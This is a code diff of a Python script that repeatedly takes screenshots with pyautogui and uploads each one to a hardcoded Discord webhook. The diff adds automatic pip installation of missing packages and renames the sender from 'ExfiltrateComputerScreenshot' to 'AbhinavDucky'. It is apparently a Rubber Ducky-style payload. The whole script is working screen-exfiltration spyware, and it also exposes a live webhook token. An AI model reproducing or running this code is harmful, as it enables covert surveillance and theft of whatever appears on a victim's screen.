@@ -1,12 +1,31 @@
+import subprocess
+import sys
+
+#Function to install required dependencies
+def install_dependency(package):
+    subprocess.check_call([sys.executable, "-m", "pip","install",package])
+    
+#List of required dependencies
+required_packages=["requests","pyautogui"]
+
+#Install missing dependencies
+for package in required_packages:
+    try:
+        __import__(package)
+    except ImportError:
+        print(f"Installing {package}...")
+        install_dependency(package)
+        
+#Importing the installed and required dependencies    
 import pyautogui
 from time import sleep
 import requests
-
+from time import sleep
 
 # YOUR DISCORD WEBHOOK
 discord_webhook = "https://discord.com/api/webhooks/1346209552860839987/g3dfx4FqXkbRjr1TbIJLj0LOUeMULIkvvoqbROuyDjVT0Fym6XfUiR4rhTfrjDuIMKLQ"
 
-# Edit this variables as you want
+# Screenshot Settings
 SCREENSHOTS = 10
 TIMING = 5
 
@@ -21,13 +40,13 @@ for i in range(SCREENSHOTS):
         foto = f.read()
 
     richiesta = {
-        "username": "ExfiltrateComputerScreenshot"
+        "username": "AbhinavDucky"
     }
 
     # Send the message by attaching the photo
     response = requests.post(discord_webhook, data=richiesta, files={"Screen#"+str(i)+".png": foto})
 
-    # Useful for debugging
+    # Debugging
     if response.status_code == 200:
          print("Photo successfully sent!")
     else:
